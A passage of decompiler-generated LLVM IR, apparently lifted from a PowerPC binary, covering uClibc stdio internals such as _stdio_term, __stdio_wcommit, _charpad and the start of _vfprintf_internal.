  store i32 ptrtoint (i16* @global_var_10028270.307 to i32), i32* @r27, align 4
  %v3_1000cd8c = load i16, i16* @global_var_10028270.307, align 2
  %v4_1000cd8c = zext i16 %v3_1000cd8c to i32
  store i32 %v4_1000cd8c, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000cd94.594 to i32), i32* @lr, align 4
  %v1_1000cd90 = call i32 @isatty(i32 0)
  %v1_1000cd94 = sub i32 1, %v1_1000cd90
  %v1_1000cd98 = mul i32 %v1_1000cd94, 256
  %v0_1000cd9c = load i32, i32* @r29, align 4
  %v2_1000cd9c = xor i32 %v1_1000cd98, %v0_1000cd9c
  %v1_1000cda4 = trunc i32 %v2_1000cd9c to i16
  store i16 %v1_1000cda4, i16* @global_var_10028270.307, align 2
  %v3_1000cda8 = load i16, i16* @global_var_100282c0.308, align 2
  %v4_1000cda8 = zext i16 %v3_1000cda8 to i32
  store i32 %v4_1000cda8, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000cdb0.595 to i32), i32* @lr, align 4
  %v1_1000cdac = call i32 @isatty(i32 1)
  %v1_1000cdb0 = sub i32 1, %v1_1000cdac
  %v1_1000cdb4 = mul i32 %v1_1000cdb0, 256
  %v0_1000cdb8 = load i32, i32* @r29, align 4
  %v2_1000cdb8 = xor i32 %v1_1000cdb4, %v0_1000cdb8
  %v1_1000cdbc = trunc i32 %v2_1000cdb8 to i16
  store i16 %v1_1000cdbc, i16* @global_var_100282c0.308, align 2
  %v0_1000cdc0 = load i32, i32* @r25, align 4
  %v1_1000cdc0 = load i32, i32* @r26, align 4
  %v2_1000cdc0 = inttoptr i32 %v1_1000cdc0 to i32*
  store i32 %v0_1000cdc0, i32* %v2_1000cdc0, align 4
  ret i32 %v1_1000cdb4

; uselistorder directives
  uselistorder i32 %v1_1000cdb4, { 1, 0 }
  uselistorder i16* @global_var_100282c0.308, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10016b48.596 to i32), i32* @r4, align 4
  %v0_1000cde4 = call i32 @memcpy()
  ret i32 %v0_1000cde4
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10028240.591 to i32), i32* @r3, align 4
  store i32 268488196, i32* @lr, align 4
  %v0_1000ce00 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10028258.585 to i32), i32* @r3, align 4
  store i32 268488208, i32* @lr, align 4
  %v0_1000ce0c = call i32 @__stdio_init_mutex()
  store i32 268632064, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000ce589 = icmp eq i32 %storemerge6, 0
  %v1_1000ce5c11 = add i32 %storemerge6, 56
  store i32 %v1_1000ce5c11, i32* %r30.global-to-local, align 4
  br i1 %v3_1000ce589, label %dec_label_pc_1000ce68, label %dec_label_pc_1000ce1c

dec_label_pc_1000ce1c:                            ; preds = %entry, %dec_label_pc_1000ce48
  %v0_1000ce1c = call i32 @__pthread_return_0()
  %v3_1000ce20 = icmp eq i32 %v0_1000ce1c, 0
  %v0_1000ce24 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ce24, i32* @r3, align 4
  br i1 %v3_1000ce20, label %dec_label_pc_1000ce48, label %dec_label_pc_1000ce2c

dec_label_pc_1000ce2c:                            ; preds = %dec_label_pc_1000ce1c
  %v0_1000ce2c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ce2c = add i32 %v0_1000ce2c, 8
  %v2_1000ce2c = inttoptr i32 %v1_1000ce2c to i32*
  %v3_1000ce2c = load i32, i32* %v2_1000ce2c, align 4
  store i32 %v3_1000ce2c, i32* %r9.global-to-local, align 4
  %v3_1000ce34 = inttoptr i32 %v0_1000ce2c to i16*
  store i16 48, i16* %v3_1000ce34, align 2
  %v0_1000ce38 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ce38 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ce38 = add i32 %v1_1000ce38, 20
  %v3_1000ce38 = inttoptr i32 %v2_1000ce38 to i32*
  store i32 %v0_1000ce38, i32* %v3_1000ce38, align 4
  %v0_1000ce3c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ce3c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ce3c = add i32 %v1_1000ce3c, 24
  %v3_1000ce3c = inttoptr i32 %v2_1000ce3c to i32*
  store i32 %v0_1000ce3c, i32* %v3_1000ce3c, align 4
  %v0_1000ce40 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ce40 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ce40 = add i32 %v1_1000ce40, 28
  %v3_1000ce40 = inttoptr i32 %v2_1000ce40 to i32*
  store i32 %v0_1000ce40, i32* %v3_1000ce40, align 4
  %v0_1000ce44 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ce44 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ce44 = add i32 %v1_1000ce44, 16
  %v3_1000ce44 = inttoptr i32 %v2_1000ce44 to i32*
  store i32 %v0_1000ce44, i32* %v3_1000ce44, align 4
  br label %dec_label_pc_1000ce48

dec_label_pc_1000ce48:                            ; preds = %dec_label_pc_1000ce1c, %dec_label_pc_1000ce2c
  %v1_1000ce4c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ce4c = add i32 %v1_1000ce4c, 52
  %v3_1000ce4c = inttoptr i32 %v2_1000ce4c to i32*
  store i32 1, i32* %v3_1000ce4c, align 4
  store i32 268488276, i32* @lr, align 4
  %v0_1000ce50 = call i32 @__stdio_init_mutex()
  %v0_1000ce54 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ce54 = add i32 %v0_1000ce54, 32
  %v2_1000ce54 = inttoptr i32 %v1_1000ce54 to i32*
  %storemerge = load i32, i32* %v2_1000ce54, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000ce58 = icmp eq i32 %storemerge, 0
  %v1_1000ce5c = add i32 %storemerge, 56
  store i32 %v1_1000ce5c, i32* %r30.global-to-local, align 4
  br i1 %v3_1000ce58, label %dec_label_pc_1000ce58.dec_label_pc_1000ce68_crit_edge, label %dec_label_pc_1000ce1c

dec_label_pc_1000ce58.dec_label_pc_1000ce68_crit_edge: ; preds = %dec_label_pc_1000ce48
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  br label %dec_label_pc_1000ce68

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce58.dec_label_pc_1000ce68_crit_edge, %entry
  %v0_1000cea416 = phi i32 [ %v1_1000ce5c, %dec_label_pc_1000ce58.dec_label_pc_1000ce68_crit_edge ], [ %v1_1000ce5c11, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000ce58.dec_label_pc_1000ce68_crit_edge ], [ 0, %entry ]
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000ce8c5 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000ce8c5, label %dec_label_pc_1000ce94, label %dec_label_pc_1000ce74

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce68, %dec_label_pc_1000ce88
  %v0_1000ce74 = phi i32 [ %storemerge1, %dec_label_pc_1000ce88 ], [ %storemerge12, %dec_label_pc_1000ce68 ]
  %v1_1000ce74 = inttoptr i32 %v0_1000ce74 to i16*
  %v2_1000ce74 = load i16, i16* %v1_1000ce74, align 2
  %v3_1000ce74 = zext i16 %v2_1000ce74 to i32
  store i32 %v0_1000ce74, i32* @r3, align 4
  %v1_1000ce7c = and i32 %v3_1000ce74, 64
  store i32 %v1_1000ce7c, i32* %r9.global-to-local, align 4
  %v3_1000ce7c = icmp eq i32 %v1_1000ce7c, 0
  br i1 %v3_1000ce7c, label %dec_label_pc_1000ce88, label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce74
  store i32 268488328, i32* @lr, align 4
  %v0_1000ce84 = call i32 @__stdio_wcommit()
  %v0_1000ce88.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ce88

dec_label_pc_1000ce88:                            ; preds = %dec_label_pc_1000ce74, %dec_label_pc_1000ce84
  %v0_1000ce88 = phi i32 [ %v0_1000ce74, %dec_label_pc_1000ce74 ], [ %v0_1000ce88.pre, %dec_label_pc_1000ce84 ]
  %v0_1000cea417 = phi i32 [ %v0_1000ce74, %dec_label_pc_1000ce74 ], [ %v0_1000ce84, %dec_label_pc_1000ce84 ]
  %v1_1000ce88 = add i32 %v0_1000ce88, 32
  %v2_1000ce88 = inttoptr i32 %v1_1000ce88 to i32*
  %storemerge1 = load i32, i32* %v2_1000ce88, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000ce8c = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000ce8c, label %dec_label_pc_1000ce94, label %dec_label_pc_1000ce74

dec_label_pc_1000ce94:                            ; preds = %dec_label_pc_1000ce88, %dec_label_pc_1000ce68
  %v0_1000cea4 = phi i32 [ %v0_1000cea416, %dec_label_pc_1000ce68 ], [ %v0_1000cea417, %dec_label_pc_1000ce88 ]
  ret i32 %v0_1000cea4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000ce74, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000ce88, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce74, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce48, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce1c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000ceb0 = load i32, i32* @r31, align 4
  %v0_1000ceb4 = load i32, i32* @r3, align 4
  %v1_1000cebc = add i32 %v0_1000ceb4, 8
  %v2_1000cebc = inttoptr i32 %v1_1000cebc to i32*
  %v3_1000cebc = load i32, i32* %v2_1000cebc, align 4
  %v1_1000cec0 = add i32 %v0_1000ceb4, 16
  %v2_1000cec0 = inttoptr i32 %v1_1000cec0 to i32*
  %v3_1000cec0 = load i32, i32* %v2_1000cec0, align 4
  %v2_1000cec8 = sub i32 %v3_1000cec0, %v3_1000cebc
  store i32 %v2_1000cec8, i32* @r5, align 4
  %v5_1000cec8 = icmp eq i32 %v2_1000cec8, 0
  br i1 %v5_1000cec8, label %dec_label_pc_1000ced8, label %dec_label_pc_1000ced0

dec_label_pc_1000ced0:                            ; preds = %entry
  store i32 %v3_1000cebc, i32* %v2_1000cec0, align 4
  store i32 268488408, i32* @lr, align 4
  %v2_1000ced4 = inttoptr i32 %v3_1000cebc to i16*
  %v3_1000ced4 = call i32 @__stdio_WRITE(i16* %v2_1000ced4, i32 %v2_1000cec8)
  %v0_1000ced8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ced8

dec_label_pc_1000ced8:                            ; preds = %entry, %dec_label_pc_1000ced0
  %v0_1000ced8 = phi i32 [ %v0_1000ceb4, %entry ], [ %v0_1000ced8.pre, %dec_label_pc_1000ced0 ]
  %v1_1000ced8 = add i32 %v0_1000ced8, 8
  %v2_1000ced8 = inttoptr i32 %v1_1000ced8 to i32*
  %v3_1000ced8 = load i32, i32* %v2_1000ced8, align 4
  %v1_1000cedc = add i32 %v0_1000ced8, 16
  %v2_1000cedc = inttoptr i32 %v1_1000cedc to i32*
  %v3_1000cedc = load i32, i32* %v2_1000cedc, align 4
  store i32 %v0_1000ceb0, i32* @r31, align 4
  %v2_1000cee4 = sub i32 %v3_1000cedc, %v3_1000ced8
  ret i32 %v2_1000cee4

; uselistorder directives
  uselistorder i32 %v0_1000ced8, { 1, 0 }
  uselistorder i32 %v3_1000cebc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ced8, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000cf203 = icmp eq i32 %arg3, 0
  %v2_1000cf24 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000cf203, label %dec_label_pc_1000cf40, label %dec_label_pc_1000cf34

dec_label_pc_1000cf1c:                            ; preds = %dec_label_pc_1000cf34
  %v1_1000cf1c = add i32 %v0_1000cf1c, -1
  store i32 %v1_1000cf1c, i32* @r31, align 4
  %v3_1000cf20 = icmp eq i32 %v1_1000cf1c, 0
  %v0_1000cf2c = load i32, i32* @r29, align 4
  br i1 %v3_1000cf20, label %dec_label_pc_1000cf40.loopexit, label %dec_label_pc_1000cf34

dec_label_pc_1000cf34:                            ; preds = %entry, %dec_label_pc_1000cf1c
  %v0_1000cf2c5 = phi i32 [ %v0_1000cf2c, %dec_label_pc_1000cf1c ], [ %arg1, %entry ]
  store i32 268488504, i32* @lr, align 4
  %v3_1000cf34 = inttoptr i32 %v0_1000cf2c5 to i16*
  %v4_1000cf34 = call i32 @__stdio_fwrite(i32 %v2_1000cf24, i32 1, i16* %v3_1000cf34)
  %v3_1000cf38 = icmp eq i32 %v4_1000cf34, 1
  %v0_1000cf1c = load i32, i32* @r31, align 4
  br i1 %v3_1000cf38, label %dec_label_pc_1000cf1c, label %dec_label_pc_1000cf40.loopexit

dec_label_pc_1000cf40.loopexit:                   ; preds = %dec_label_pc_1000cf1c, %dec_label_pc_1000cf34
  %v0_1000cf44.ph = phi i32 [ %v0_1000cf1c, %dec_label_pc_1000cf34 ], [ 0, %dec_label_pc_1000cf1c ]
  %v1_1000cf44.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cf40

dec_label_pc_1000cf40:                            ; preds = %dec_label_pc_1000cf40.loopexit, %entry
  %v1_1000cf44 = phi i32 [ 0, %entry ], [ %v1_1000cf44.pre, %dec_label_pc_1000cf40.loopexit ]
  %v0_1000cf44 = phi i32 [ 0, %entry ], [ %v0_1000cf44.ph, %dec_label_pc_1000cf40.loopexit ]
  %v2_1000cf44 = sub i32 %v1_1000cf44, %v0_1000cf44
  ret i32 %v2_1000cf44

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cf40.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf34, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000cf6c = and i32 %arg2, 128
  %v3_1000cf6c = icmp eq i32 %v1_1000cf6c, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000cf6c, label %dec_label_pc_1000cfbc, label %dec_label_pc_1000cf88

dec_label_pc_1000cf88:                            ; preds = %entry
  %v0_1000cf88 = call i32 @__GI_strlen()
  %v0_1000cf8c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cf88, i32* @r31, align 4
  %v0_1000cf94 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000cf98 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cf98 = sub i32 %v1_1000cf98, %v0_1000cf88
  store i32 %v2_1000cf98, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cf88, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000cf98, 1
  br i1 %tmp7, label %dec_label_pc_1000cfbc, label %dec_label_pc_1000cfa8

dec_label_pc_1000cfa8:                            ; preds = %dec_label_pc_1000cf88
  %v1_1000cf8c = urem i32 %v0_1000cf8c, 128
  store i32 268488620, i32* @lr, align 4
  %v3_1000cfa8 = trunc i32 %v1_1000cf8c to i8
  %v4_1000cfa8 = call i32 @_charpad(i32 %v0_1000cf94, i8 %v3_1000cfa8, i32 %v2_1000cf98)
  %v0_1000cfac = load i32, i32* @r31, align 4
  store i32 %v0_1000cfac, i32* %r30.global-to-local, align 4
  %v1_1000cfb0 = load i32, i32* @r29, align 4
  %v4_1000cfb0 = icmp eq i32 %v4_1000cfa8, %v1_1000cfb0
  store i32 %v4_1000cfa8, i32* @r28, align 4
  br i1 %v4_1000cfb0, label %dec_label_pc_1000cfa8.dec_label_pc_1000cfbc_crit_edge, label %dec_label_pc_1000cfe0

dec_label_pc_1000cfa8.dec_label_pc_1000cfbc_crit_edge: ; preds = %dec_label_pc_1000cfa8
  %v0_1000cfc8.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000cfbc

dec_label_pc_1000cfbc:                            ; preds = %dec_label_pc_1000cfa8.dec_label_pc_1000cfbc_crit_edge, %dec_label_pc_1000cf88, %entry
  %v0_1000cfc8 = phi i32 [ %v0_1000cfc8.pre, %dec_label_pc_1000cfa8.dec_label_pc_1000cfbc_crit_edge ], [ %v0_1000cf94, %dec_label_pc_1000cf88 ], [ %arg1, %entry ]
  %v0_1000cfc4 = phi i32 [ %v0_1000cfac, %dec_label_pc_1000cfa8.dec_label_pc_1000cfbc_crit_edge ], [ %v0_1000cf88, %dec_label_pc_1000cf88 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000cfc4, 1
  br i1 %tmp8, label %dec_label_pc_1000cfdc, label %dec_label_pc_1000cfd4

dec_label_pc_1000cfd4:                            ; preds = %dec_label_pc_1000cfbc
  %v0_1000cfc0 = load i32, i32* @r27, align 4
  store i32 268488664, i32* @lr, align 4
  %v3_1000cfd4 = inttoptr i32 %v0_1000cfc8 to i16*
  %v4_1000cfd4 = call i32 @__stdio_fwrite(i32 %v0_1000cfc0, i32 %v0_1000cfc4, i16* %v3_1000cfd4)
  br label %dec_label_pc_1000cfdc

dec_label_pc_1000cfdc:                            ; preds = %dec_label_pc_1000cfbc, %dec_label_pc_1000cfd4
  %v1_1000cfdc = phi i32 [ 0, %dec_label_pc_1000cfbc ], [ %v4_1000cfd4, %dec_label_pc_1000cfd4 ]
  %v0_1000cfdc = load i32, i32* @r28, align 4
  %v2_1000cfdc = add i32 %v0_1000cfdc, %v1_1000cfdc
  br label %dec_label_pc_1000cfe0

dec_label_pc_1000cfe0:                            ; preds = %dec_label_pc_1000cfa8, %dec_label_pc_1000cfdc
  %v0_1000cfe4 = phi i32 [ %v4_1000cfa8, %dec_label_pc_1000cfa8 ], [ %v2_1000cfdc, %dec_label_pc_1000cfdc ]
  ret i32 %v0_1000cfe4

; uselistorder directives
  uselistorder i32 %v0_1000cfc4, { 1, 0 }
  uselistorder i32 %v2_1000cf98, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfdc, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000cffc = load i32, i32* @lr, align 4
  store i32 %v0_1000cffc, i32* %r0.global-to-local, align 4
  %v2_1000d004 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000d004, i32* %r30.global-to-local, align 4
  %v0_1000d008 = load i32, i32* @r3, align 4
  store i32 %v0_1000d008, i32* %r24.global-to-local, align 4
  %v0_1000d014 = load i32, i32* @r5, align 4
  store i32 %v0_1000d014, i32* %r31.global-to-local, align 4
  %v0_1000d018 = load i32, i32* @r4, align 4
  store i32 %v0_1000d018, i32* @r29, align 4
  store i32 268488736, i32* @lr, align 4
  %v1_1000d01c = bitcast i8** %stack_var_-200 to i32*
  %v2_1000d01c = call i32 @_ppfs_init(i32* %v1_1000d01c)
  %tmp72 = icmp sgt i32 %v2_1000d01c, -1
  br i1 %tmp72, label %dec_label_pc_1000d050, label %dec_label_pc_1000d028

dec_label_pc_1000d028:                            ; preds = %entry
  %v3_1000d028 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000d028 = ptrtoint i8* %v3_1000d028 to i32
  store i32 %v4_1000d028, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000d028, i32* @r3, align 4
  %v0_1000d034 = call i32 @__GI_strlen()
  %v3_1000d038 = icmp eq i32 %v0_1000d034, 0
  br i1 %v3_1000d038, label %dec_label_pc_1000d650, label %dec_label_pc_1000d040

dec_label_pc_1000d040:                            ; preds = %dec_label_pc_1000d028
  %v0_1000d040 = load i32, i32* @r31, align 4
  %v0_1000d044 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000d04c.597 to i32), i32* @lr, align 4
  %v3_1000d048 = inttoptr i32 %v0_1000d044 to i16*
  %v4_1000d048 = call i32 @__stdio_fwrite(i32 %v0_1000d040, i32 %v0_1000d034, i16* %v3_1000d048)
  br label %dec_label_pc_1000d650

dec_label_pc_1000d050:                            ; preds = %entry
  %v0_1000d054 = load i32, i32* @r31, align 4
  store i32 268488796, i32* @lr, align 4
  %v2_1000d058 = call i32 @_ppfs_prepargs(i32 %v2_1000d004, i32 %v0_1000d054)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000d0f0 = zext i8 %tmp59 to i32
  %v2_1000d0f4 = icmp sgt i32 %tmp60, 0
  %v2_1000d0f8 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000d11c = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000d120 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000d154 = icmp eq i32 %tmp57, 0
  %v2_1000d4b0 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000d3d0 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000d3d4 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000d248 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000d324 = icmp eq i32 %tmp57, 1
  %v2_1000d2c8 = icmp ugt i32 %tmp57, 2
  %v4_1000d208 = zext i8 %tmp55 to i32
  %v0_1000d63c.pre = load i32, i32* @r29, align 4
  %v1_1000d108 = mul nuw nsw i32 %v4_1000d0f0, 8
  %v2_1000d10c = add i32 %v2_1000d0f8, %v1_1000d108
  %v1_1000d110 = add i32 %v2_1000d10c, -8
  %v1_1000d124 = add i32 %tmp58, 1
  %v2_1000d17c = icmp ugt i32 %tmp57, 7
  %v2_1000d35c = icmp ugt i32 %tmp57, 15
  %v2_1000d390 = icmp ugt i32 %tmp57, 17
  %v3_1000d390 = icmp eq i32 %tmp57, 17
  %v2_1000d438 = icmp ugt i32 %tmp57, 19
  %v3_1000d438 = icmp eq i32 %tmp57, 19
  %v3_1000d4a4 = icmp eq i32 %tmp57, 20
  %v1_1000d194 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10016b7c.599 to i32), i32 -1)
  %v2_1000d194 = inttoptr i32 %v1_1000d194 to i8*
  %v3_1000d2d4 = icmp eq i32 %tmp57, 3
  %v3_1000d2e4 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000d63c

dec_label_pc_1000d068.backedge:                   ; preds = %dec_label_pc_1000d0bc, %dec_label_pc_1000d074
  %storemerge13.in = phi i32 [ %v1_1000d084, %dec_label_pc_1000d074 ], [ %v1_1000d0bc, %dec_label_pc_1000d0bc ]
  %v1_1000d07c16 = phi i32 [ %v0_1000d094, %dec_label_pc_1000d074 ], [ %v1_1000d0bc, %dec_label_pc_1000d0bc ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000d068

dec_label_pc_1000d068:                            ; preds = %dec_label_pc_1000d068.backedge, %dec_label_pc_1000d63c
  %v0_1000d094 = phi i32 [ %v1_1000d07c16, %dec_label_pc_1000d068.backedge ], [ %v0_1000d63c, %dec_label_pc_1000d63c ]
  %v1_1000d084 = phi i32 [ %storemerge13, %dec_label_pc_1000d068.backedge ], [ %v0_1000d63c, %dec_label_pc_1000d63c ]
  %v1_1000d068 = inttoptr i32 %v1_1000d084 to i8*
  %v2_1000d068 = load i8, i8* %v1_1000d068, align 1
  %v3_1000d068 = zext i8 %v2_1000d068 to i32
  store i32 %v3_1000d068, i32* %r0.global-to-local, align 4
  %v3_1000d06c = icmp eq i8 %v2_1000d068, 0
  br i1 %v3_1000d06c, label %dec_label_pc_1000d07c, label %dec_label_pc_1000d074

dec_label_pc_1000d074:                            ; preds = %dec_label_pc_1000d068
  %v3_1000d074 = icmp eq i8 %v2_1000d068, 37
  br i1 %v3_1000d074, label %dec_label_pc_1000d07c, label %dec_label_pc_1000d068.backedge

dec_label_pc_1000d07c:                            ; preds = %dec_label_pc_1000d074, %dec_label_pc_1000d068
  %v4_1000d07c = icmp eq i32 %v1_1000d084, %v0_1000d094
  br i1 %v4_1000d07c, label %dec_label_pc_1000d0b0, label %dec_label_pc_1000d084

dec_label_pc_1000d084:                            ; preds = %dec_label_pc_1000d07c
  %v2_1000d084 = sub i32 %v1_1000d084, %v0_1000d094
  store i32 %v2_1000d084, i32* @r31, align 4
  %v4_1000d084 = icmp sgt i32 %v2_1000d084, 0
  br i1 %v4_1000d084, label %dec_label_pc_1000d094, label %dec_label_pc_1000d0a4

dec_label_pc_1000d094:                            ; preds = %dec_label_pc_1000d084
  %v0_1000d09c = load i32, i32* %r24.global-to-local, align 4
  store i32 268488868, i32* @lr, align 4
  %v3_1000d0a0 = inttoptr i32 %v0_1000d09c to i16*
  %v4_1000d0a0 = call i32 @__stdio_fwrite(i32 %v0_1000d094, i32 %v2_1000d084, i16* %v3_1000d0a0)
  %v1_1000d0a4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d0a4

dec_label_pc_1000d0a4:                            ; preds = %dec_label_pc_1000d084, %dec_label_pc_1000d094
  %v1_1000d0ac = phi i32 [ %v1_1000d0a4.pre, %dec_label_pc_1000d094 ], [ %v2_1000d084, %dec_label_pc_1000d084 ]
  %storemerge2 = phi i32 [ %v4_1000d0a0, %dec_label_pc_1000d094 ], [ 0, %dec_label_pc_1000d084 ]
  %v4_1000d0a4 = icmp eq i32 %storemerge2, %v1_1000d0ac
  br i1 %v4_1000d0a4, label %dec_label_pc_1000d0ac, label %dec_label_pc_1000d64c

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d0a4
  %v0_1000d0ac = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d0ac = add i32 %v0_1000d0ac, %v1_1000d0ac
  store i32 %v2_1000d0ac, i32* %r23.global-to-local, align 4
  %v0_1000d0b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000d0b0

dec_label_pc_1000d0b0:                            ; preds = %dec_label_pc_1000d07c, %dec_label_pc_1000d0ac
  %v0_1000d0bc = phi i32 [ %v0_1000d094, %dec_label_pc_1000d07c ], [ %v0_1000d0b0.pre, %dec_label_pc_1000d0ac ]
  %v1_1000d0b0 = inttoptr i32 %v0_1000d0bc to i8*
  %v2_1000d0b0 = load i8, i8* %v1_1000d0b0, align 1
  %v3_1000d0b0 = zext i8 %v2_1000d0b0 to i32
  store i32 %v3_1000d0b0, i32* %r0.global-to-local, align 4
  %v3_1000d0b4 = icmp eq i8 %v2_1000d0b0, 0
  br i1 %v3_1000d0b4, label %dec_label_pc_1000d650, label %dec_label_pc_1000d0bc

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d0b0
  %v1_1000d0bc = add i32 %v0_1000d0bc, 1
  %v2_1000d0bc = inttoptr i32 %v1_1000d0bc to i8*
  %v3_1000d0bc = load i8, i8* %v2_1000d0bc, align 1
  %v4_1000d0bc = zext i8 %v3_1000d0bc to i32
